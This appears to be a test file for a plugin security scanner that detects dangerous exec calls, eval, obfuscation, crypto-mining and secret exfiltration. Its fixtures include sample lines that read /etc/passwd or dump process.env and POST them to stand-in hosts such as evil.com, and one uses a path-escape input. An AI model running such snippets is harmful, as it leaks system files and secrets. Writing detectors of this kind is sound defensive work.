import fsSync from "node:fs";
import fs from "node:fs/promises";
import os from "node:os";
import path from "node:path";
import { afterAll, afterEach, describe, expect, it, vi } from "vitest";
import {
  clearSkillScanCacheForTest,
  isScannable,
  scanDirectory,
  scanDirectoryWithSummary,
  scanSource,
} from "./skill-scanner.js";
import type { SkillScanOptions } from "./skill-scanner.js";

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

const fixtureRoot = fsSync.mkdtempSync(path.join(os.tmpdir(), "skill-scanner-test-"));
let fixtureId = 0;

afterAll(() => {
  fsSync.rmSync(fixtureRoot, { recursive: true, force: true });
});

function makeTmpDir(): string {
  const dir = path.join(fixtureRoot, `case-${fixtureId++}`);
  fsSync.mkdirSync(dir, { recursive: true });
  return dir;
}

function expectScanRule(
  source: string,
  expected: { ruleId: string; severity?: "warn" | "critical"; messageIncludes?: string },
) {
  const findings = scanSource(source, "plugin.ts");
  expect(
    findings.filter(
      (finding) =>
        finding.ruleId === expected.ruleId &&
        (expected.severity == null || finding.severity === expected.severity) &&
        (expected.messageIncludes == null || finding.message.includes(expected.messageIncludes)),
    ),
  ).not.toEqual([]);
}

function writeFixtureFiles(root: string, files: Record<string, string | undefined>) {
  for (const [relativePath, source] of Object.entries(files)) {
    if (source == null) {
      continue;
    }
    const filePath = path.join(root, relativePath);
    fsSync.mkdirSync(path.dirname(filePath), { recursive: true });
    fsSync.writeFileSync(filePath, source);
  }
}

function mockStatPermissionDeniedFor(filePath: string) {
  const realStat = fs.stat;
  return vi.spyOn(fs, "stat").mockImplementation(async (...args) => {
    const pathArg = args[0];
    if (typeof pathArg === "string" && pathArg === filePath) {
      const err = new Error("EACCES: permission denied") as NodeJS.ErrnoException;
      err.code = "EACCES";
      throw err;
    }
    return await realStat(...args);
  });
}

function expectRulePresence(findings: { ruleId: string }[], ruleId: string, expected: boolean) {
  const ruleIds = findings.map((finding) => finding.ruleId);
  if (expected) {
    expect(ruleIds).toContain(ruleId);
  } else {
    expect(ruleIds).not.toContain(ruleId);
  }
}

async function runNamedCase(name: string, run: () => void | Promise<void>) {
  try {
    await run();
  } catch (error) {
    throw new Error(`case failed: ${name}`, { cause: error });
  }
}

function runSyncNamedCase(name: string, run: () => void) {
  try {
    run();
  } catch (error) {
    throw new Error(`case failed: ${name}`, { cause: error });
  }
}

function normalizeSkillScanOptions(
  options?: Readonly<{
    maxFiles?: number;
    maxFileBytes?: number;
    includeFiles?: readonly string[];
    excludeTestFiles?: boolean;
  }>,
): SkillScanOptions | undefined {
  if (!options) {
    return undefined;
  }
  return {
    ...(options.maxFiles != null ? { maxFiles: options.maxFiles } : {}),
    ...(options.maxFileBytes != null ? { maxFileBytes: options.maxFileBytes } : {}),
    ...(options.includeFiles ? { includeFiles: [...options.includeFiles] } : {}),
    ...(options.excludeTestFiles != null ? { excludeTestFiles: options.excludeTestFiles } : {}),
  };
}

type FixtureFiles = Record<string, string | undefined>;

type ScanDirectoryCase = {
  name: string;
  files: FixtureFiles;
  includeFiles?: readonly string[];
  excludeTestFiles?: boolean;
  expectedRuleId: string;
  expectedPresent: boolean;
  expectedMinFindings?: number;
};

type SummaryCase = {
  name: string;
  files: FixtureFiles;
  options?: Readonly<{
    maxFiles?: number;
    maxFileBytes?: number;
    includeFiles?: readonly string[];
    excludeTestFiles?: boolean;
  }>;
  expected: {
    scannedFiles: number;
    critical?: number;
    warn?: number;
    info?: number;
    findingCount?: number;
    maxFindings?: number;
    expectedRuleId?: string;
    expectedPresent?: boolean;
  };
};

afterEach(() => {
  clearSkillScanCacheForTest();
});

// ---------------------------------------------------------------------------
// scanSource
// ---------------------------------------------------------------------------

describe("scanSource", () => {
  const scanRuleCases = [
    {
      name: "detects child_process exec with string interpolation",
      source: `
import { exec } from "child_process";
const cmd = \`ls \${dir}\`;
exec(cmd);
`,
      expected: { ruleId: "dangerous-exec", severity: "critical" as const },
    },
    {
      name: "detects child_process spawn usage",
      source: `
const cp = require("child_process");
cp.spawn("node", ["server.js"]);
`,
      expected: { ruleId: "dangerous-exec", severity: "critical" as const },
    },
    {
      name: "detects child_process namespaced exec usage",
      source: `
const cp = require("child_process");
cp.exec("node server.js");
`,
      expected: { ruleId: "dangerous-exec", severity: "critical" as const },
    },
    {
      name: "detects eval usage",
      source: `
const code = "1+1";
const result = eval(code);
`,
      expected: { ruleId: "dynamic-code-execution", severity: "critical" as const },
    },
    {
      name: "detects new Function constructor",
      source: `
const fn = new Function("a", "b", "return a + b");
`,
      expected: { ruleId: "dynamic-code-execution", severity: "critical" as const },
    },
    {
      name: "detects fs.readFile combined with fetch POST (exfiltration)",
      source: `
import fs from "node:fs";
const data = fs.readFileSync("/etc/passwd", "utf-8");
fetch("https://evil.com/collect", { method: "post", body: data });
`,
      expected: { ruleId: "potential-exfiltration", severity: "warn" as const },
    },
    {
      name: "detects hex-encoded strings (obfuscation)",
      source: `
const payload = "\\x72\\x65\\x71\\x75\\x69\\x72\\x65";
`,
      expected: { ruleId: "obfuscated-code", severity: "warn" as const },
    },
    {
      name: "detects base64 decode of large payloads (obfuscation)",
      source: `
const data = atob("${"A".repeat(250)}");
`,
      expected: { ruleId: "obfuscated-code", messageIncludes: "base64" },
    },
    {
      name: "detects stratum protocol references (mining)",
      source: `
const pool = "stratum+tcp://pool.example.com:3333";
`,
      expected: { ruleId: "crypto-mining", severity: "critical" as const },
    },
    {
      name: "detects WebSocket to non-standard high port",
      source: `
const ws = new WebSocket("ws://remote.host:9999");
`,
      expected: { ruleId: "suspicious-network", severity: "warn" as const },
    },
    {
      name: "detects process.env access combined with network send (env harvesting)",
      source: `
const secrets = JSON.stringify(process.env);
fetch("https://evil.com/harvest", { method: "POST", body: secrets });
`,
      expected: { ruleId: "env-harvesting", severity: "critical" as const },
    },
  ] as const;

  it("detects suspicious source patterns", () => {
    for (const testCase of scanRuleCases) {
      runSyncNamedCase(testCase.name, () => {
        expectScanRule(testCase.source, testCase.expected);
      });
    }
  });

  it("does not flag child_process import without exec/spawn call", () => {
    const source = `
// This module wraps child_process for safety
import type { ExecOptions } from "child_process";
const options: ExecOptions = { timeout: 5000 };
`;
    const findings = scanSource(source, "plugin.ts");
    expectRulePresence(findings, "dangerous-exec", false);
  });

  it("does not flag RegExp.exec when child_process appears elsewhere", () => {
    const source = `
import type { ExecOptions } from "child_process";
const options: ExecOptions = {};
const match = /^keychain:(.+)$/.exec(value);
`;
    const findings = scanSource(source, "plugin.ts");
    expectRulePresence(findings, "dangerous-exec", false);
  });

  it("does not use full-line comments as source-rule context", () => {
    const source = `
const env = process.env;
// fetch() can reach the endpoint later.
`;
    const findings = scanSource(source, "plugin.ts");
    expectRulePresence(findings, "env-harvesting", false);
  });

  it("does not use inline or block comments as source-rule context", () => {
    const source = `
const env = process.env; // fetch("https://example.invalid")
/*
 * rest.post("/channels/123/messages", {});
 */
const url = "https://example.com/path//segment";
`;
    const findings = scanSource(source, "plugin.ts");
    expectRulePresence(findings, "env-harvesting", false);
  });

  it("returns empty array for clean plugin code", () => {
    const source = `
export function greet(name: string): string {
  return \`Hello, \${name}!\`;
}
`;
    const findings = scanSource(source, "plugin.ts");
    expect(findings).toStrictEqual([]);
  });

  it("returns empty array for normal http client code (just a fetch GET)", () => {
    const source = `
const response = await fetch("https://api.example.com/data");
const json = await response.json();
console.log(json);
`;
    const findings = scanSource(source, "plugin.ts");
    expect(findings).toStrictEqual([]);
  });

  it("does not treat fetch in names or comments as network send context", () => {
    const source = `
const inheritedOutputPath = process.env.OPENCLAW_RUN_NODE_OUTPUT_LOG?.trim();
async function closeFetchHandles() {
  // Best-effort cleanup for stale fetch keep-alive handles.
}
`;
    const findings = scanSource(source, "plugin.ts");
    expectRulePresence(findings, "env-harvesting", false);
  });

  it("does not flag ordinary env defaults when network sends are elsewhere in a bundled file", () => {
    const source = `
function resolvePreferencesStorePath(env = process.env) {
  return path.join(resolveStateDir(env), "discord", "model-picker-preferences.json");
}

${"\n".repeat(20)}

export async function sendMessage(rest, channelId, data) {
  return await rest.post(\`/channels/\${channelId}/messages\`, data);
}
`;
    const findings = scanSource(source, "provider-bundle.js");
    expectRulePresence(findings, "env-harvesting", false);
  });

  it("still flags local process.env sends", () => {
    const source = `
const env = process.env;
await fetch("https://evil.example/harvest", { method: "POST", body: JSON.stringify(env) });
`;
    const findings = scanSource(source, "plugin.ts");
    expectRulePresence(findings, "env-harvesting", true);
  });
});

// ---------------------------------------------------------------------------
// isScannable
// ---------------------------------------------------------------------------

describe("isScannable", () => {
  it("classifies scannable extensions", () => {
    for (const [fileName, expected] of [
      ["file.js", true],
      ["file.ts", true],
      ["file.mjs", true],
      ["file.cjs", true],
      ["file.tsx", true],
      ["file.jsx", true],
      ["readme.md", false],
      ["package.json", false],
      ["logo.png", false],
      ["style.css", false],
    ] as const) {
      runSyncNamedCase(fileName, () => {
        expect(isScannable(fileName)).toBe(expected);
      });
    }
  });
});

// ---------------------------------------------------------------------------
// scanDirectory
// ---------------------------------------------------------------------------

describe("scanDirectory", () => {
  const scanDirectoryCases: readonly ScanDirectoryCase[] = [
    {
      name: "scans .js files in a directory tree",
      files: {
        "index.js": `const x = eval("1+1");`,
        "lib/helper.js": `export const y = 42;`,
      },
      expectedRuleId: "dynamic-code-execution",
      expectedPresent: true,
      expectedMinFindings: 1,
    },
    {
      name: "skips node_modules directories",
      files: {
        "node_modules/evil-pkg/index.js": `const x = eval("hack");`,
        "clean.js": `export const x = 1;`,
      },
      expectedRuleId: "dynamic-code-execution",
      expectedPresent: false,
    },
    {
      name: "skips hidden directories",
      files: {
        ".hidden/secret.js": `const x = eval("hack");`,
        "clean.js": `export const x = 1;`,
      },
      expectedRuleId: "dynamic-code-execution",
      expectedPresent: false,
    },
    {
      name: "skips test directories and test files when requested",
      files: {
        "tests/telemetry.test.ts": `const secrets = JSON.stringify(process.env);\nfetch("https://evil.example/harvest", { method: "POST", body: secrets });`,
        "src/runtime.spec.ts": `const x = eval("hack");`,
        "src/runtime.js": `export const x = 1;`,
      },
      excludeTestFiles: true,
      expectedRuleId: "env-harvesting",
      expectedPresent: false,
    },
    {
      name: "scans explicitly included test files when test exclusion is requested",
      files: {
        "tests/runtime.test.ts": `const x = eval("hack");`,
        "src/runtime.js": `export const x = 1;`,
      },
      includeFiles: ["tests/runtime.test.ts"],
      excludeTestFiles: true,
      expectedRuleId: "dynamic-code-execution",
      expectedPresent: true,
    },
    {
      name: "scans hidden entry files when explicitly included",
      files: {
        ".hidden/entry.js": `const x = eval("hack");`,
      },
      includeFiles: [".hidden/entry.js"],
      expectedRuleId: "dynamic-code-execution",
      expectedPresent: true,
    },
    {
      name: "skips non-scannable includeFiles entries like .png (line 406)",
      files: {
        "logo.png": "binary-content",
        "clean.js": `export const x = 1;`,
      },
      includeFiles: ["logo.png"],
      expectedRuleId: "dynamic-code-execution",
      expectedPresent: false,
    },
    {
      name: "skips missing files in includeFiles (lines 468-471 — ENOENT in resolveForcedFiles)",
      files: {
        "clean.js": `export const x = 1;`,
      },
      // "nonexistent.js" doesn't exist — stat throws ENOENT → continue at line 418
      includeFiles: ["nonexistent.js"],
      expectedRuleId: "dynamic-code-execution",
      expectedPresent: false,
    },
    {
      name: "deduplicates file present in both includeFiles and walked directory (line 451)",
      files: {
        // regular.js is in the root and will be found by both walkDirWithLimit and includeFiles
        "regular.js": `const x = eval("hack");`,
      },
      // Including the same file ensures it appears in forcedFiles AND walkedFiles
      includeFiles: ["regular.js"],
      expectedRuleId: "dynamic-code-execution",
      expectedPresent: true,
      expectedMinFindings: 1,
    },
  ];

  it("scans directory trees and explicit includes", async () => {
    for (const testCase of scanDirectoryCases) {
      await runNamedCase(testCase.name, async () => {
        const root = makeTmpDir();
        writeFixtureFiles(root, testCase.files);
        const findings = await scanDirectory(
          root,
          testCase.includeFiles || testCase.excludeTestFiles
            ? {
                ...(testCase.includeFiles ? { includeFiles: [...testCase.includeFiles] } : {}),
                ...(testCase.excludeTestFiles
                  ? { excludeTestFiles: testCase.excludeTestFiles }
                  : {}),
              }
            : undefined,
        );
        if (testCase.expectedMinFindings != null) {
          expect(findings.length).toBeGreaterThanOrEqual(testCase.expectedMinFindings);
        }
        expectRulePresence(findings, testCase.expectedRuleId, testCase.expectedPresent);
        clearSkillScanCacheForTest();
      });
    }
  });
});

// ---------------------------------------------------------------------------
// scanDirectoryWithSummary
// ---------------------------------------------------------------------------

describe("scanDirectoryWithSummary", () => {
  const summaryCases: readonly SummaryCase[] = [
    {
      name: "returns correct counts",
      files: {
        "a.js": `const x = eval("code");`,
        "src/b.ts": `const pool = "stratum+tcp://pool:3333";`,
        "src/c.ts": `export const clean = true;`,
      },
      expected: {
        scannedFiles: 3,
        critical: 2,
        warn: 0,
        info: 0,
        findingCount: 2,
      },
    },
    {
      name: "caps scanned file count with maxFiles",
      files: {
        "a.js": `const x = eval("a");`,
        "b.js": `const x = eval("b");`,
        "c.js": `const x = eval("c");`,
      },
      options: { maxFiles: 2 },
      expected: {
        scannedFiles: 2,
        maxFindings: 2,
      },
    },
    {
      name: "skips files above maxFileBytes",
      files: {
        "large.js": `eval("${"A".repeat(4096)}");`,
      },
      options: { maxFileBytes: 64 },
      expected: {
        scannedFiles: 0,
        findingCount: 0,
      },
    },
    {
      name: "ignores missing included files",
      files: {
        "clean.js": `export const ok = true;`,
      },
      options: { includeFiles: ["missing.js"] },
      expected: {
        scannedFiles: 1,
        findingCount: 0,
      },
    },
    {
      name: "prioritizes included entry files when maxFiles is reached",
      files: {
        "regular.js": `export const ok = true;`,
        ".hidden/entry.js": `const x = eval("hack");`,
      },
      options: {
        maxFiles: 1,
        includeFiles: [".hidden/entry.js"],
      },
      expected: {
        scannedFiles: 1,
        expectedRuleId: "dynamic-code-execution",
        expectedPresent: true,
      },
    },
  ];

  it("summarizes directory scan results", async () => {
    for (const testCase of summaryCases) {
      await runNamedCase(testCase.name, async () => {
        const root = makeTmpDir();
        writeFixtureFiles(root, testCase.files);
        const summary = await scanDirectoryWithSummary(
          root,
          normalizeSkillScanOptions(testCase.options),
        );
        expect(summary.scannedFiles).toBe(testCase.expected.scannedFiles);
        if (testCase.expected.critical != null) {
          expect(summary.critical).toBe(testCase.expected.critical);
        }
        if (testCase.expected.warn != null) {
          expect(summary.warn).toBe(testCase.expected.warn);
        }
        if (testCase.expected.info != null) {
          expect(summary.info).toBe(testCase.expected.info);
        }
        if (testCase.expected.findingCount != null) {
          expect(summary.findings).toHaveLength(testCase.expected.findingCount);
        }
        if (testCase.expected.maxFindings != null) {
          expect(summary.findings.length).toBeLessThanOrEqual(testCase.expected.maxFindings);
        }
        if (testCase.expected.expectedRuleId != null && testCase.expected.expectedPresent != null) {
          expectRulePresence(
            summary.findings,
            testCase.expected.expectedRuleId,
            testCase.expected.expectedPresent,
          );
        }
        clearSkillScanCacheForTest();
      });
    }
  });

  it("throws when reading a scannable file fails", async () => {
    const root = makeTmpDir();
    const filePath = path.join(root, "bad.js");
    fsSync.writeFileSync(filePath, "export const ok = true;\n");

    const realReadFile = fs.readFile;
    const spy = vi.spyOn(fs, "readFile").mockImplementation(async (...args) => {
      const pathArg = args[0];
      if (typeof pathArg === "string" && pathArg === filePath) {
        const err = new Error("EACCES: permission denied") as NodeJS.ErrnoException;
        err.code = "EACCES";
        throw err;
      }
      return await realReadFile(...args);
    });

    try {
      await expect(scanDirectoryWithSummary(root)).rejects.toMatchObject({ code: "EACCES" });
    } finally {
      spy.mockRestore();
    }
  });

  it("invalidates file scan cache when maxFileBytes changes between scans", async () => {
    // First scan with maxFileBytes=1024: populates cache with entry
    // Second scan with maxFileBytes=64: size/mtime same but maxFileBytes differs →
    // getCachedFileScanResult returns undefined (deletes stale entry)
    const root = makeTmpDir();
    writeFixtureFiles(root, { "a.js": `export const x = 1;` });
    await scanDirectory(root, { maxFileBytes: 1024 });
    // Change maxFileBytes — cache entry has different maxFileBytes → lines 93-94 hit
    const findings = await scanDirectory(root, { maxFileBytes: 64 });
    expect(findings).toHaveLength(0);
  });

  it("skips includeFiles entries that escape the root directory", async () => {
    const root = makeTmpDir();
    writeFixtureFiles(root, { "clean.js": `export const x = 1;` });
    // "../../etc/passwd" resolves outside root — isPathInside returns false → continue
    const findings = await scanDirectory(root, { includeFiles: ["../../etc/passwd"] });
    expect(findings).toHaveLength(0);
  });

  it("re-throws when stat throws a non-ENOENT error during file scan", async () => {
    const root = makeTmpDir();
    const filePath = path.join(root, "noperm.js");
    fsSync.writeFileSync(filePath, `export const x = 1;`);

    const spy = mockStatPermissionDeniedFor(filePath);

    try {
      await expect(scanDirectory(root)).rejects.toMatchObject({ code: "EACCES" });
    } finally {
      spy.mockRestore();
    }
  });

  it("reuses cached findings for unchanged files and invalidates on file updates", async () => {
    const root = makeTmpDir();
    const filePath = path.join(root, "cached.js");
    fsSync.writeFileSync(filePath, `const x = eval("1+1");`);

    const readSpy = vi.spyOn(fs, "readFile");
    const first = await scanDirectoryWithSummary(root);
    const second = await scanDirectoryWithSummary(root);

    expect(first.critical).toBeGreaterThan(0);
    expect(second.critical).toBe(first.critical);
    expect(readSpy).toHaveBeenCalledTimes(1);

    await fs.writeFile(filePath, `const x = eval("2+2");\n// cache bust`, "utf-8");
    const third = await scanDirectoryWithSummary(root);

    expect(third.critical).toBeGreaterThan(0);
    expect(readSpy).toHaveBeenCalledTimes(2);
    readSpy.mockRestore();
  });

  it("reuses cached directory listings for unchanged trees", async () => {
    const root = makeTmpDir();
    fsSync.writeFileSync(path.join(root, "cached.js"), `export const ok = true;`);

    const readdirSpy = vi.spyOn(fs, "readdir");
    await scanDirectoryWithSummary(root);
    await scanDirectoryWithSummary(root);

    expect(readdirSpy).toHaveBeenCalledTimes(1);
    readdirSpy.mockRestore();
  });
});
